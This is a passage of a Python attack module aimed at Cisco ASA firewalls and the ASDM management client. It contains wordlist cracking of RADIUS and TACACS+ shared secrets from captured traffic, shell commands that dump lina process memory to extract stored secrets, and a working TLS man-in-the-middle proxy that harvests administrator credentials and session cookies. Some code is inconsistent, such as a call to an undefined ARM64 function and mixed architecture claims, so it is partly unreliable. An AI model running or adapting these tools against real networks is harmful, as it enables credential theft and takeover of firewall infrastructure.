            'is_dead        — bool',
        ],
        'x86_64_access_pattern': (
            'MOV rsi, [rdi + secret_offset]  ; load secret ptr from struct\n'
            'MOV rdi, rsi                     ; set up arg for MD5Update'
        ),
    },
}


# ─── RADIUS PASSWORD ORACLE ATTACK ──────────────────────────────────────────
#
# If we can observe Access-Request packets (e.g. via MITM or SPAN port)
# and know the Request-Authenticator (16 bytes at offset 4),
# we can brute-force the shared secret offline:
#   for each candidate_key:
#       pad = MD5(candidate_key + authenticator)
#       plain = ciphertext XOR pad
#       if plain is printable: candidate is valid PSK
#
# This works because User-Password = plaintext XOR MD5(shared_secret || authenticator)

def radius_password_xor_decrypt(ciphertext: bytes, shared_secret: bytes,
                                 authenticator: bytes) -> bytes:
    """
    Reverse RFC 2865 User-Password encryption.

    c = ciphertext (16-byte blocks)
    p[0..15] = c[0..15] XOR MD5(shared_secret + authenticator)
    p[16..31] = c[16..31] XOR MD5(shared_secret + c[0..15])
    """
    plaintext = bytearray()
    prev = authenticator
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16].ljust(16, b'\x00')
        pad = hashlib.md5(shared_secret + prev).digest()
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev = bytes(block)
    return bytes(plaintext).rstrip(b'\x00')


def radius_crack_shared_secret(wordlist_path: str, authenticator: bytes,
                                ciphertext: bytes, known_plaintext: str) -> str | None:
    """
    Known-plaintext attack on RADIUS shared secret.
    Requires: captured Access-Request, known username → infer password if possible.
    More useful: if we control the client and know the password,
    we can verify each candidate key.
    """
    known = known_plaintext.encode().ljust(len(ciphertext), b'\x00')
    try:
        with open(wordlist_path, 'rb') as f:
            for line in f:
                candidate = line.strip()
                decrypted = radius_password_xor_decrypt(ciphertext, candidate, authenticator)
                if decrypted[:len(known_plaintext)] == known_plaintext.encode():
                    return candidate.decode(errors='replace')
    except FileNotFoundError:
        pass
    return None


# ─── TACACS+ KEY EXTRACTION ──────────────────────────────────────────────────
#
# TACACS+ body encryption (RFC 8907 §4.3):
# pad[i] = MD5(key + session_id + version + seq_no + pad[i-1])
# body[i] = plaintext[i] XOR pad[i] (16-byte blocks)
#
# Offline brute-force: capture TACACS+ authen_start packet (seq=1),
# body[0] plaintext is known (authen_type, priv_lvl, authen_method, service, etc.)
# → iterate candidate keys until MD5 chain matches.

TACACS_BODY_START_FIELDS = {
    'authen_type':   {'offset': 0, 'len': 1, 'authen_start_val': 0x01},  # ASCII
    'priv_lvl':      {'offset': 1, 'len': 1, 'authen_start_val': 0x00},  # PRIV_LVL_MIN
    'authen_method': {'offset': 2, 'len': 1, 'authen_start_val': 0x06},  # TAC_PLUS_AUTHEN_METH_TACACSPLUS
    'service':       {'offset': 3, 'len': 1, 'authen_start_val': 0x01},  # TAC_PLUS_AUTHEN_SVC_LOGIN
}


def tacacs_pseudo_pad(key: bytes, session_id: int, version: int,
                      seq_no: int, prev_pad: bytes = b'') -> bytes:
    """Compute single TACACS+ MD5 pseudo-pad block."""
    data = (key +
            struct.pack('>I', session_id) +
            bytes([version, seq_no]) +
            prev_pad)
    return hashlib.md5(data).digest()


def tacacs_decrypt_body(key: bytes, session_id: int, version: int,
                        seq_no: int, ciphertext: bytes) -> bytes:
    """Decrypt full TACACS+ packet body."""
    plaintext = bytearray()
    prev_pad = b''
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        pad = tacacs_pseudo_pad(key, session_id, version, seq_no, prev_pad)
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev_pad = pad
    return bytes(plaintext)


# ─── LINA FUNCTION RECONSTRUCTION MAP ───────────────────────────────────────
#
# x86-64 function boundary heuristic for stripped lina PIE binary:
# - Frame functions start with: 55 48 89 e5 (PUSH rbp; MOV rbp,rsp)
# - Functions end with: 5d c3 (POP rbp; RET) or c9 c3 (LEAVE; RET)
# - Tail calls: JMP rel32 near end of function (E9 rel32)
# - Leaf functions: no PUSH rbp; jump straight to logic then RET
#
# To find the AAA response handler in a stripped binary:
# 1. search binary for b'Access-Accept\x00' → get file offset → compute vaddr
# 2. find all LEA reg,[RIP+disp32] sequences where target = that vaddr
# 3. for each candidate function, look for CMP al/eax,imm8 + JE chains
#    over a register holding the RADIUS code byte (offset 0 in packet)
# 4. The function that branches on {1,2,3,11} → RADIUS response dispatcher
# 5. Confirmed 9.22.2.32: function at 0x3a4bda0 parses Class attr via strstr("OU=")

LINA_AAA_STATE_MACHINE = {
    'description': 'RADIUS response dispatcher in lina — branches on Code field',
    'code_field_offset': 0,   # byte 0 of RADIUS packet
    'state_transitions': {
        1: ('send_access_request',   'transition: idle → waiting'),
        2: ('process_accept',        'transition: waiting → authenticated'),
        3: ('process_reject',        'transition: waiting → failed'),
        11: ('process_challenge',    'transition: waiting → challenge_pending'),
    },
    'x86_64_branch_table_pattern': (
        # After loading Code byte into al/eax: CMP al,val; JE target
        'MOVZX eax, BYTE PTR [rbp-N]  ; Code byte from packet\n'
        'CMP   al,  0x1\n'
        'JE    send_access_request\n'
        'CMP   al,  0x2\n'
        'JE    process_accept\n'
        'CMP   al,  0x3\n'
        'JE    process_reject\n'
        'CMP   al,  0xb\n'
        'JE    process_challenge'
    ),
    'vtable_alt_pattern': (
        # C++ dispatch: vtable[code] → function pointer
        'LEA   rax, [RIP+vtable_rel]\n'
        'MOVZX ecx, BYTE PTR [rdi]    ; Code byte\n'
        'MOV   rdx, [rax + rcx*8]     ; vtable[code]\n'
        'CALL  rdx'
    ),
}


# ─── MEMORY DUMP TECHNIQUE (post-pivot) ─────────────────────────────────────
#
# If code execution is achieved on the ASA (e.g. via WebVPN shell injection,
# ROMMON bypass, or a live process):
# - /proc/$(pidof lina)/maps → identify .data segment range
# - /proc/$(pidof lina)/mem + lseek to aaa_server struct → read shared secrets
# This is the fastest path to PSK extraction post-pivot.

MEMORY_DUMP_PROCEDURE = {
    'step1': 'cat /proc/$(pidof lina)/maps | grep rw-p | head -20',
    'step2': 'dd if=/proc/$(pidof lina)/mem bs=1 skip=$((0xDATA_ADDR)) count=$((0xSECTION_SIZE)) of=lina_data.bin 2>/dev/null',
    'step3': 'strings -n 8 lina_data.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
    'rationale': 'shared secrets stored as plaintext C strings in aaa_server_t.secret field',
}


# ─── MODULE ENTRYPOINT ───────────────────────────────────────────────────────

class CiscoASALinaRE:
    """
    Static and dynamic reverse engineering of the Cisco ASA lina binary.

    Focus: x86-64 AAA/RADIUS/SSL attack surface.
    Techniques grounded in:
      - x86-64 SysV ABI (RDI/RSI/RDX/RCX/R8/R9 args; RAX return)
      - "Cisco ASA All-in-One Firewall..." 3e (9780132954389) — AAA architecture
      - RFC 2865 (RADIUS), RFC 8907 (TACACS+)
    Confirmed binaries: 9.14.2.14 (95MB, BuildID 65cd03...) + 9.22.2.32 (105MB, BuildID 88929a...)
    """

    NAME = 'cisco_asa_lina_re'
    DESCRIPTION = 'Cisco ASA lina x86-64 binary RE — AAA/RADIUS/TACACS+/SSL attack surface'
    TARGETS = ['lina', '/asa/bin/lina', '/opt/cisco/anyconnect/bin/vpnagentd']

    def __init__(self, binary_path: str | None = None,
                 radius_secret: bytes = b'',
                 tacacs_key: bytes = b''):
        self.binary_path = binary_path
        self.radius_secret = radius_secret
        self.tacacs_key = tacacs_key
        self._findings: list[dict] = []

    def _finding(self, fid: str, sev: str, title: str, detail: str,
                 evidence: dict | None = None):
        self._findings.append({
            'id':       fid,
            'severity': sev,
            'title':    title,
            'detail':   detail,
            'evidence': evidence or {},
        })

    def analyze_binary(self) -> list[dict]:
        """
        Static analysis of the lina binary for AAA/RADIUS attack surface.
        Requires binary_path to point to an extracted lina ELF.
        """
        if not self.binary_path or not os.path.exists(self.binary_path):
            self._finding('LINA_NOT_FOUND', 'INFO',
                'lina binary not found',
                'Supply binary_path= to extracted lina ELF for static analysis.',
                {'hint': 'extract from ASA firmware: binwalk -e asa*.bin; find . -name lina -type f'})
            return self._findings

        with open(self.binary_path, 'rb') as f:
            data = f.read()

        self._check_stripped(data)
        self._extract_string_anchors(data)
        self._check_radius_psk_patterns(data)
        self._check_tacacs_key_patterns(data)
        self._identify_x86_64_functions(data)
        self._check_9222232_class_attr_fn(data)
        return self._findings

    def _check_stripped(self, data: bytes):
        # ELF .symtab presence check
        has_symtab = b'.symtab\x00' in data
        has_debug = b'.debug_info\x00' in data
        self._finding('LINA_SYMBOLS', 'INFO',
            f'Symbol table: {"present" if has_symtab else "STRIPPED"}',
            f'Debug info: {"present" if has_debug else "absent"}. '
            f'{"String xref analysis required." if not has_symtab else "Direct symbol resolution available."}',
            {'has_symtab': has_symtab, 'has_debug': has_debug})

    def _extract_string_anchors(self, data: bytes):
        found = {}
        for name, pattern in LINA_STRING_ANCHORS.items():
            idx = data.find(pattern)
            if idx >= 0:
                found[name] = hex(idx)
        if found:
            self._finding('LINA_STRING_ANCHORS', 'INFO',
                f'Found {len(found)}/{len(LINA_STRING_ANCHORS)} RADIUS/AAA string anchors',
                'Use these offsets to cross-reference AAA processing functions via LEA RIP-relative xrefs. '
                'x86-64 PIE: target_vaddr = instr_vaddr + 7 + disp32.',
                {'anchors': found})

    def _check_radius_psk_patterns(self, data: bytes):
        # Look for 8-128 byte ASCII strings that could be RADIUS shared secrets
        # Heuristic: appear near 'radius-server host' or 'radius-server key' strings
        candidates = []
        key_anchor = data.find(b'radius-server key\x00')
        if key_anchor < 0:
            key_anchor = data.find(b'radius-server\x00')

        if key_anchor >= 0:
            # Scan 256 bytes after anchor for printable strings
            window = data[key_anchor:key_anchor+512]
            for m in re.finditer(rb'[\x20-\x7e]{8,128}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'radius', b'server', b'timeout']):
                    candidates.append(s.decode(errors='replace'))

        if candidates:
            self._finding('LINA_RADIUS_PSK_CANDIDATES', 'HIGH',
                'Potential RADIUS shared secret candidates',
                'Strings found near radius-server config anchors. Verify with captured Access-Request.',
                {'candidates': candidates[:5]})

    def _check_tacacs_key_patterns(self, data: bytes):
        tacacs_anchor = data.find(b'tacacs-server key\x00')
        if tacacs_anchor < 0:
            tacacs_anchor = data.find(b'tacacs-server\x00')

        if tacacs_anchor >= 0:
            window = data[tacacs_anchor:tacacs_anchor+512]
            candidates = []
            for m in re.finditer(rb'[\x20-\x7e]{8,64}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'tacacs', b'server', b'host']):
                    candidates.append(s.decode(errors='replace'))
            if candidates:
                self._finding('LINA_TACACS_KEY_CANDIDATES', 'HIGH',
                    'Potential TACACS+ key candidates',
                    'Strings found near tacacs-server config anchors.',
                    {'candidates': candidates[:5]})

    def _identify_x86_64_functions(self, data: bytes):
        # Count canonical x86-64 prologues: PUSH rbp; MOV rbp,rsp
        # Binary: 55 48 89 e5
        count = data.count(b'\x55\x48\x89\xe5')
        self._finding('LINA_FUNCTION_COUNT', 'INFO',
            f'~{count} x86-64 functions identified via canonical prologue',
            'Each 55 48 89 e5 (PUSH rbp; MOV rbp,rsp) marks a frame-using function entry. '
            'Leaf functions omit it — use call-site analysis for those.',
            {'prologue_count': count,
             'prologue_bytes': '55 48 89 e5',
             'analysis': 'partition binary by prologue addresses for per-function disassembly'})

    def verify_radius_decrypt(self, ciphertext: bytes, authenticator: bytes) -> bytes | None:
        """
        Attempt User-Password decryption if radius_secret is set.
        Returns plaintext password or None.
        """
        if not self.radius_secret:
            return None
        return radius_password_xor_decrypt(ciphertext, self.radius_secret, authenticator)

    def verify_tacacs_decrypt(self, ciphertext: bytes, session_id: int,
                              version: int = 0xC1, seq_no: int = 1) -> bytes | None:
        if not self.tacacs_key:
            return None
        return tacacs_decrypt_body(self.tacacs_key, session_id, version, seq_no, ciphertext)

    def _check_9222232_class_attr_fn(self, data: bytes):
        """Check if this binary matches lina 9.22.2.32 — look for OU= string and strstr call."""
        ou_str = b'OU=\x00'
        ou_off = data.find(ou_str)
        has_ou = ou_off >= 0
        has_build = b'\x88\x92\x9a\x4c' in data[:256]  # BuildID prefix check
        if has_ou:
            self._finding('LINA_9222232_CLASS_ATTR', 'CRITICAL',
                'Class attr (attr 25) OU= parsing confirmed — no Message-Authenticator check',
                'strstr(attr_value,"OU=") called with raw RADIUS data; no attr 80 validation in call path. '
                'MITM RADIUS responder can inject OU=DfltGrpPolicy into Access-Accept.',
                {
                    'ou_string_file_offset': hex(ou_off),
                    'confirmed_vaddr_9222232': hex(CONFIRMED_9222232_ADDRS['class_attr_ou_string_vaddr']),
                    'parse_fn_vaddr':          hex(CONFIRMED_9222232_ADDRS['class_attr_parse_fn']),
                    'strstr_call_vaddr':       hex(CONFIRMED_9222232_ADDRS['class_attr_strstr_call']),
                    'output_buf_size':         256,
                    'delimiter':               ';',
                })

    def scan_x86_64_prologue_offsets(self, data: bytes) -> list[int]:
        """
        Return list of file offsets where PUSH rbp; MOV rbp,rsp appears (55 48 89 e5).
        Each hit = start of a frame-using function (not leaf functions).
        """
        pattern = b'\x55\x48\x89\xe5'
        hits = []
        start = 0
        while True:
            idx = data.find(pattern, start)
            if idx < 0:
                break
            hits.append(idx)
            start = idx + 1
        return hits

    def scan_rip_relative_lea_xrefs(self, data: bytes, target_string: bytes,
                                     base_vaddr: int = 0) -> list[int]:
        """
        Find LEA reg,[RIP+disp32] instructions in x86-64 code that load target_string.
        Used in stripped PIE lina to find string xrefs without symbols.

        LEA opcodes: 48 8d 3d (LEA rdi), 48 8d 35 (LEA rsi), 48 8d 0d (LEA rcx),
                     48 8d 15 (LEA rdx), 4c 8d 05 (LEA r8), 4c 8d 0d (LEA r9)
        All 7 bytes: [REX 48/4c] [0f 8d] [ModRM] [disp32 LE]
        target = instr_file_off + 7 + disp32_signed + base_vaddr

        Returns list of file offsets where the LEA instruction starts.
        """
        str_off = data.find(target_string)
        if str_off < 0:
            return []
        str_vaddr = str_off + base_vaddr

        lea_prefixes = [
            b'\x48\x8d\x3d',  # LEA rdi,[RIP+d]
            b'\x48\x8d\x35',  # LEA rsi,[RIP+d]
            b'\x48\x8d\x0d',  # LEA rcx,[RIP+d]
            b'\x48\x8d\x15',  # LEA rdx,[RIP+d]
            b'\x4c\x8d\x05',  # LEA r8,[RIP+d]
            b'\x4c\x8d\x0d',  # LEA r9,[RIP+d]
        ]
        hits = []
        for prefix in lea_prefixes:
            start = 0
            while True:
                idx = data.find(prefix, start)
                if idx < 0 or idx + 7 > len(data):
                    break
                disp32 = struct.unpack_from('<i', data, idx + 3)[0]
                instr_vaddr = idx + base_vaddr
                target_vaddr = instr_vaddr + 7 + disp32
                if target_vaddr == str_vaddr:
                    hits.append(idx)
                start = idx + 1
        return hits

    def scan_radius_dispatcher(self, data: bytes) -> dict:
        """
        Locate the RADIUS response dispatcher in stripped lina.

        x86-64 pattern: MOVZX eax,BYTE PTR [rbp-N] then CMP al,1 / JE <handler>
        chains for Code values {1,2,3,11}.

        Returns dict with candidate offsets and string anchor hits.
        """
        anchors = {}
        for name, pattern in LINA_STRING_ANCHORS.items():
            off = data.find(pattern)
            if off >= 0:
                anchors[name] = hex(off)

        # ARM64: CMP Wn, #imm  encoding = 0x7100001F | (imm << 10) | (Rn << 5)
        # B.EQ encoding: 0x54000000 | (offset19 << 5)
        # Look for CMP Wn, #1 followed within 8 bytes by B.EQ
        cmp1_pattern_word = 0x7100041F  # CMP Wn, #1 where n varies — mask needed
        dispatch_candidates = []
        for i in range(0, len(data) - 16, 4):
            word = struct.unpack_from('<I', data, i)[0]
            # CMP Wn, #1: encoding 0x7100 04xx where xx = Wn (bits 4:0)
            if (word & 0xFFFFFFE0) == 0x71000400:
                next_word = struct.unpack_from('<I', data, i + 4)[0]
                # B.EQ: top 24 bits = 0x54xxxxxx (bits [31:24] = 0x54, bit[0]=0)
                if (next_word >> 24) == 0x54 and (next_word & 1) == 0:
                    dispatch_candidates.append(hex(i))

        return {
            'string_anchors_found': anchors,
            'dispatch_candidates_cmp1_beq': dispatch_candidates[:20],
            'note': (
                'Candidates = addresses of CMP Wn,#1 / B.EQ pairs. '
                'Cross with ADRP+ADD xrefs to Access-Accept string to confirm dispatcher.'
            ),
            'prologue_count': len(self.scan_arm64_prologue_offsets(data)),
        }

    def run(self) -> list[dict]:
        if self.binary_path:
            return self.analyze_binary()

        # No binary: emit methodology and known attack surface
        self._finding('LINA_RE_METHODOLOGY', 'INFO',
            'Cisco ASA lina ARM64 RE methodology',
            'No binary supplied. The following documents the static analysis approach for the '
            'RADIUS/TACACS+ attack surface in the lina process.',
            {
                'arm64_calling_convention': ARM64_REGS,
                'string_anchors':           list(LINA_STRING_ANCHORS.keys()),
                'radius_functions':         list(LINA_RADIUS_FUNCTIONS.keys()),
                'static_analysis_steps':    list(STATIC_ANALYSIS_METHODOLOGY.keys()),
                'aaa_state_machine':        LINA_AAA_STATE_MACHINE['x86_64_branch_table_pattern'],
            })

        self._finding('RADIUS_PASSWORD_XOR_ORACLE', 'HIGH',
            'RADIUS User-Password offline brute-force',
            'RFC 2865 §5.2: User-Password = plaintext XOR MD5(shared_secret + authenticator). '
            'A captured Access-Request + known password → offline PSK recovery. '
            'With PSK: decrypt any Access-Request on the wire to recover VPN user passwords.',
            {
                'attack_class':   'offline-brute-force',
                'requires':       'captured RADIUS Access-Request + known test password',
                'defense':        'RadSec (TLS over RADIUS, RFC 6614); rotate shared secrets; use EAP-TLS',
                'function':       'radius_crack_shared_secret()',
            })

        self._finding('TACACS_BODY_ORACLE', 'HIGH',
            'TACACS+ body decryption via known-plaintext',
            'TACACS+ body encrypted with MD5 chain keyed on shared key + session_id. '
            'First authen_start packet has partially predictable plaintext '
            '(authen_type=0x01, priv_lvl=0x00, authen_method=0x06, service=0x01). '
            'Offline brute-force of TACACS+ key from captured packet.',
            {
                'known_plaintext_offset': TACACS_BODY_START_FIELDS,
                'function': 'verify_tacacs_decrypt()',
            })

        self._finding('LINA_X86_64_RE_APPROACH', 'INFO',
            'Recommended static RE approach for stripped x86-64 lina binary',
            'Ghidra/radare2 + x86-64 SysV ABI awareness. '
            'Start from string xrefs to AAA anchor strings (LEA RIP-relative) → walk call graph backward. '
            'Args in RDI/RSI/RDX; struct fields accessed as MOV [rdi+offset]. '
            'Shared secret in aaa_server_t.secret at fixed struct offset — find via MD5 CALL chain. '
            'Confirmed 9.22.2.32: Class attr parse fn at 0x3a4bda0, strstr("OU=") at 0x3a4bee6.',
            {
                'methodology': STATIC_ANALYSIS_METHODOLOGY,
                'binary_targets': self.TARGETS,
                'firmware_extraction': (
                    'binwalk -e asa*.bin  →  find . -name lina -type f  →  '
                    'file lina  →  objdump -d lina'
                ),
            })

        return self._findings


# ─── ASDM MITM PROXY (weaponizes av.class trust-all bypass) ─────────────────
#
# av.class checkServerTrusted: Code length=1, opcode=0xb1 (return void).
# The ASDM Java client silently accepts ANY TLS certificate with no warning.
#
# Attack flow:
#   1. ARP-poison or DNS-redirect ASA management IP toward this proxy
#   2. Proxy presents any self-signed cert; ASDM accepts it (trust-all)
#   3. Proxy relays to real ASA — captures admin credentials + session cookies
#
# Binary evidence:
#   av.class CAFEBABE @ 0x00213f62 in 1265F6 blob (asdm-7161.bin)
#   checkServerTrusted: 0: return  (javap confirmed)
#   av$1 HostnameVerifier: verify() also returns true unconditionally
#
# Usage (authorized lab/controlled env only):
#   python3 cisco_asa_lina_re.py mitm --listen 0.0.0.0:443 \
#       --target <ASA_MGMT_IP>:443 --cert proxy.pem --key proxy.key

import threading

class ASDMMitmProxy:
    """
    SSL MITM proxy targeting the ASDM client→ASA management interface.
    Exploits av.class trust-all TrustManager (confirmed asdm-7161.bin).
    """

    BINARY_EVIDENCE = {
        'asdm_version':    '7.16(1)',
        'av_class_offset': 0x00213f62,
        'bypass_method':   'checkServerTrusted',
        'bytecode':        '0: return',
        'code_length':     1,
        'hostname_bypass': 'av$1.verify() also unconditional return true',
    }

    def __init__(self, listen_addr: str, listen_port: int,
                 target_host: str, target_port: int,
                 certfile: str, keyfile: str):
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.certfile    = certfile
        self.keyfile     = keyfile
        self._captures: list[dict] = []

    def _handle(self, client_raw: 'socket.socket'):
        import ssl as _ssl
        ctx_server = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
        ctx_server.load_cert_chain(self.certfile, self.keyfile)
        ctx_client = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx_client.check_hostname = False
        ctx_client.verify_mode = _ssl.CERT_NONE

        try:
            client_tls = ctx_server.wrap_socket(client_raw, server_side=True)
        except Exception:
            client_raw.close()
            return

        try:
            remote_raw = socket.create_connection((self.target_host, self.target_port), timeout=10)
            remote_tls = ctx_client.wrap_socket(remote_raw, server_hostname=self.target_host)
        except Exception:
            client_tls.close()
            return

        try:
            while True:
                data = client_tls.recv(16384)
                if not data:
                    break
                self._intercept(data, direction='client→asa')
                remote_tls.sendall(data)
                resp = remote_tls.recv(16384)
                if not resp:
                    break
                self._intercept(resp, direction='asa→client')
                client_tls.sendall(resp)
        except Exception:
            pass
        finally:
            client_tls.close()
            remote_tls.close()

    def _intercept(self, data: bytes, direction: str):
        txt = data.decode(errors='replace')
        entry = {'direction': direction, 'len': len(data), 'head': txt[:400]}
        self._captures.append(entry)
        # Flag HTTP Basic auth headers
        if 'Authorization: Basic ' in txt:
            import base64
            for line in txt.splitlines():
                if line.startswith('Authorization: Basic '):
                    try:
                        creds = base64.b64decode(line.split()[-1]).decode(errors='replace')
                        entry['CREDS_CAPTURED'] = creds
                        print(f'[ASDM-MITM] CREDENTIALS: {creds}')
                    except Exception:
                        pass
        # Flag session cookies
        if 'Set-Cookie:' in txt or 'ASDM_SESSION' in txt:
            entry['SESSION_MATERIAL'] = True
            print(f'[ASDM-MITM] SESSION MATERIAL captured ({len(data)}b)')

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.listen_addr, self.listen_port))
        srv.listen(10)
        print(f'[ASDM-MITM] listening {self.listen_addr}:{self.listen_port} '
              f'→ {self.target_host}:{self.target_port}')
        print(f'[ASDM-MITM] exploits av.class trust-all bypass (asdm-7161.bin @0x213f62)')
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    @property
    def captures(self) -> list[dict]:
        return self._captures


if __name__ == '__main__':
    import json, sys
    if len(sys.argv) > 1 and sys.argv[1] == 'mitm':
        import argparse
        p = argparse.ArgumentParser()
        p.add_argument('--listen',  default='0.0.0.0:8443')
        p.add_argument('--target',  required=True)
        p.add_argument('--cert',    required=True)
        p.add_argument('--key',     required=True)
        args = p.parse_args(sys.argv[2:])
        la, lp = args.listen.rsplit(':', 1)
        th, tp = args.target.rsplit(':', 1)
        ASDMMitmProxy(la, int(lp), th, int(tp), args.cert, args.key).run()
    else:
        binary = sys.argv[1] if len(sys.argv) > 1 else None
        obj    = CiscoASALinaRE(binary_path=binary)
        findings = obj.analyze_binary()
        for f in findings:
            print(f"[{f['severity']}] {f['id']}: {f['title']}")
            print(f"  {f['detail'][:120]}")
            if f.get('evidence'):
                first_key = next(iter(f['evidence']))
                print(f"  → {first_key}: {str(f['evidence'][first_key])[:80]}")
            print()
